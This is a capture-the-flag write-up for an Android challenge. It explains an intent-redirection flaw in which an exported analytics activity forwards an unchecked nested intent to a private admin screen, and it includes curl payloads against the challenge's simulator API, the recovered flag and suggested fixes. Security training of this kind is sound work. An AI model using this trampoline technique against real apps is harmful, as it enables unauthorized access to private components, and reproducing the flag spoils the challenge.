# Phantom Thread

## Metadata

| Field | Value |
| --- | --- |
| Category | `mobile` |
| Difficulty | Medium |
| Points | 100 |
| Solves | 104 |
| First Blood | onurbsecurity |

## Challenge Description

```text
FluidMsg is a messaging app. Here are its decompiled Java sources and
AndroidManifest.xml.

There's no real phone here, so a little API plays the part of Android's intent
resolver: POST an intent as JSON to /api/intent/send and the simulated app
reacts. (/api/manifest, /api/info, and /api/activities describe the target.)
```

## Artifacts

The provided archive was an encrypted ZIP. The password from the challenge notes
was:

```text
infected
```

I confirmed the archive contents before reading the Java files:

```bash
zipinfo public.zip
```

Relevant output:

```text
AndroidManifest.xml
com/fluidctf/messenger/AdminPanelActivity.java
com/fluidctf/messenger/MainActivity.java
com/fluidctf/messenger/sdk/AnalyticsRedirectActivity.java
```

The extraction step was:

```bash
7z x -pinfected -oextracted public.zip
```

The extracted artifact contained decompiled Android source:

```text
public.zip
extracted/AndroidManifest.xml
extracted/com/fluidctf/messenger/MainActivity.java
extracted/com/fluidctf/messenger/AdminPanelActivity.java
extracted/com/fluidctf/messenger/sdk/AnalyticsRedirectActivity.java
extracted/com/fluidctf/messenger/sdk/AnalyticsReceiver.java
extracted/com/fluidctf/messenger/sdk/AnalyticsTracker.java
solve_phantom_thread.sh
```

Target used during the solve:

```text
https://8ae749bc46eca4ae.chal.ctf.ae
```

## Recon

I started with the Android manifest because the challenge explicitly says the
remote API simulates Android's intent resolver. In a mobile challenge like this,
the manifest is the fastest way to understand which components are reachable
from outside the app and which components are supposed to stay private.

The package metadata showed a messaging application:

```xml
<manifest
    package="com.fluidctf.messenger"
    android:versionCode="14"
    android:versionName="3.2.1">
```

The manifest listed six activities. Most of the application screens were not
exported:

```xml
<activity
    android:name=".ChatActivity"
    android:exported="false" />

<activity
    android:name=".SettingsActivity"
    android:exported="false" />

<activity
    android:name=".ProfileActivity"
    android:exported="false" />
```

The interesting line was the admin screen. It was explicitly marked private and
also required an admin permission:

```xml
<activity
    android:name=".AdminPanelActivity"
    android:exported="false"
    android:permission="com.fluidctf.messenger.permission.ADMIN" />
```

That made `AdminPanelActivity` a likely target, but not yet a vulnerability.
The expected Android behavior is that an external app should not be able to
launch a non-exported activity directly.

The manifest also had an exported analytics SDK activity:

```xml
<activity
    android:name=".sdk.AnalyticsRedirectActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="com.fluidctf.messenger.sdk.ANALYTICS_REDIRECT" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

At this stage, the useful recon question became: does that exported SDK activity
only handle analytics metadata, or does it forward intents into the app?

## Vulnerability

`AnalyticsRedirectActivity.java` reads an extra called `next_intent` from the
incoming intent and immediately launches it:

```java
Intent incoming = getIntent();
if (incoming == null) {
    Log.w(TAG, "No intent received");
    return;
}

Intent next = incoming.getParcelableExtra("next_intent");
if (next != null) {
    Log.d(TAG, "Redirecting to: " + next.getComponent());
    startActivity(next);
} else {
    Log.d(TAG, "No redirect target specified");
    AnalyticsTracker.getInstance().logEvent("redirect_empty");
}
```

This is the source-to-sink path:

```text
external JSON intent
        |
        v
exported AnalyticsRedirectActivity
        |
        v
getParcelableExtra("next_intent")
        |
        v
startActivity(next)
```

The suspicious part was not only that `startActivity()` existed. The issue was
that the `Intent` passed to `startActivity()` came from an externally reachable
component and was not checked against an allowlist before being launched.

I confirmed the idea against Android's own security documentation. Android
describes this pattern as intent redirection: an attacker controls part or all
of an intent that a vulnerable app then uses to launch another component. The
same documentation calls out private component access as a possible impact, and
Google's remediation guide specifically warns against calling `startActivity()`
on untrusted intents without validation.

The impact in this challenge is clear from `AdminPanelActivity.java`. When the
admin panel opens, it calls the backend admin flag endpoint with the app's admin
token:

```java
URL url = new URL(BuildConfig.API_BASE_URL + "/api/admin/flag");
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setRequestMethod("GET");
conn.setRequestProperty("X-Admin-Token", BuildConfig.ADMIN_TOKEN);
```

So the bug is an intent redirection issue that lets an external caller use an
exported SDK activity as a trampoline into a private admin activity.

## Exploitation

The exploit chain was:

1. Read `AndroidManifest.xml` and list exported versus private activities.
2. Notice that `AdminPanelActivity` is private and has the behavior likely to
   retrieve the flag.
3. Notice that `AnalyticsRedirectActivity` is exported.
4. Read `AnalyticsRedirectActivity.java` and find that it launches
   `next_intent` without validating the target component.
5. Use the challenge's `/api/intent/send` simulator to prove the direct admin
   launch is blocked.
6. Send an intent to the exported analytics redirect activity with a nested
   `next_intent` pointing to `AdminPanelActivity`.
7. Let the app launch the private admin screen from inside its own context.

The root API listed the available simulator endpoints:

```bash
curl -k https://8ae749bc46eca4ae.chal.ctf.ae/
```

Response:

```json
{
  "app": "FluidMsg Intent Simulation API",
  "endpoints": {
    "/api/activities": "GET - List registered activities",
    "/api/info": "GET - App package information",
    "/api/intent/send": "POST - Send an intent to the simulated app",
    "/api/manifest": "GET - Retrieve AndroidManifest.xml"
  },
  "version": "3.2.1"
}
```

The app metadata matched the shipped manifest:

```bash
curl -k https://8ae749bc46eca4ae.chal.ctf.ae/api/info
```

Response:

```json
{
  "package": "com.fluidctf.messenger",
  "version_name": "3.2.1",
  "target_sdk": 34,
  "components": {
    "activities": 6,
    "receivers": 1,
    "services": 1
  }
}
```

The activity listing confirmed the external access boundary:

```bash
curl -k https://8ae749bc46eca4ae.chal.ctf.ae/api/activities
```

Relevant response:

```json
{
  ".AdminPanelActivity": {
    "exported": false,
    "full_name": "com.fluidctf.messenger.AdminPanelActivity",
    "has_permission": true
  },
  ".sdk.AnalyticsRedirectActivity": {
    "exported": true,
    "full_name": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
    "has_permission": false
  }
}
```

As a control, I first tried to launch the admin activity directly:

```bash
curl -k -i \
  -H 'Content-Type: application/json' \
  -d '{"component":"com.fluidctf.messenger.AdminPanelActivity","extras":{}}' \
  https://8ae749bc46eca4ae.chal.ctf.ae/api/intent/send
```

Response:

```json
{
  "error": "Activity 'com.fluidctf.messenger.AdminPanelActivity' is not exported. Cannot be launched from external intent.",
  "hint": "Only exported activities can receive external intents. Check the manifest for exported components."
}
```

Then I checked the exported redirect activity with no nested intent:

```bash
curl -k -i \
  -H 'Content-Type: application/json' \
  -d '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{}}' \
  https://8ae749bc46eca4ae.chal.ctf.ae/api/intent/send
```

Response:

```json
{
  "activity": "com.fluidctf.messenger.sdk.AnalyticsRedirectActivity",
  "result": "AnalyticsRedirectActivity started. No next_intent extra found. SDK redirect handler idle.",
  "status": "launched"
}
```

That proved the exported trampoline was reachable. I also used a harmless nested
intent to `MainActivity` to confirm that `next_intent` was actually followed:

```bash
curl -k -i \
  -H 'Content-Type: application/json' \
  -d '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_intent":{"component":"com.fluidctf.messenger.MainActivity","extras":{}}}}' \
  https://8ae749bc46eca4ae.chal.ctf.ae/api/intent/send
```

Response:

```json
{
  "activity": "com.fluidctf.messenger.MainActivity",
  "result": "Main launcher activity displayed.",
  "status": "launched"
}
```

The final payload used the same mechanism, but pointed the nested intent at the
private admin panel:

```bash
curl -k -i \
  -H 'Content-Type: application/json' \
  -d '{"component":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity","extras":{"next_intent":{"component":"com.fluidctf.messenger.AdminPanelActivity","extras":{}}}}' \
  https://8ae749bc46eca4ae.chal.ctf.ae/api/intent/send
```

Response:

```json
{
  "activity": "com.fluidctf.messenger.AdminPanelActivity",
  "api_response": {
    "data": "flag{b3999279e6ad128b}",
    "endpoint": "/api/admin/flag"
  },
  "result": "Admin panel accessed successfully.",
  "status": "launched"
}
```

## Technical Details

Android's `android:exported` setting protects an activity from being launched by
external applications. In this app, `AdminPanelActivity` had that protection:

```text
AdminPanelActivity: exported=false, permission=com.fluidctf.messenger.permission.ADMIN
```

The mistake was creating an exported component that acted as a generic redirect
handler. Once an external caller launches `AnalyticsRedirectActivity`, the
subsequent `startActivity(next)` call happens inside the vulnerable application's
process and trust boundary. The redirect handler never checks whether `next`
points to a safe analytics screen, a public app screen, or a private admin
screen.

The intended security boundary was:

```text
external caller -> exported activities only
```

The actual behavior was:

```text
external caller
        |
        v
AnalyticsRedirectActivity, exported=true
        |
        v
next_intent = AdminPanelActivity
        |
        v
startActivity(next)
        |
        v
private admin activity launches
```

A proper fix would avoid exposing a generic redirect activity. If redirecting is
required, the code should validate the nested intent before launch, allow only
expected package and class names, clear dangerous flags, or use Android's
`IntentSanitizer` pattern. The admin screen should also not depend on a mobile
client-side `BuildConfig.ADMIN_TOKEN` for privileged backend access.

## Exploit Artifact

The final artifact is [solve_phantom_thread.sh](solve_phantom_thread.sh). It
sends the nested intent payload through the challenge simulator and prints the
flag from the JSON response.

Usage:

```bash
chmod +x solve_phantom_thread.sh
./solve_phantom_thread.sh https://8ae749bc46eca4ae.chal.ctf.ae
```

The script prints the extracted flag when successful.

## Validation

Direct launch of the private admin activity:

```json
{"error":"Activity 'com.fluidctf.messenger.AdminPanelActivity' is not exported. Cannot be launched from external intent."}
```

Exported redirect activity with no nested intent:

```json
{"status":"launched","activity":"com.fluidctf.messenger.sdk.AnalyticsRedirectActivity"}
```

Exported redirect activity with a harmless nested intent:

```json
{"status":"launched","activity":"com.fluidctf.messenger.MainActivity"}
```

Exported redirect activity with the admin nested intent:

```json
{"status":"launched","activity":"com.fluidctf.messenger.AdminPanelActivity","api_response":{"data":"flag{b3999279e6ad128b}"}}
```

Final script output:

```text
flag{b3999279e6ad128b}
```

## References

- <https://developer.android.com/privacy-and-security/risks/intent-redirection>
- <https://support.google.com/faqs/answer/9267555?hl=en>

## Flag

```text
flag{b3999279e6ad128b}
```
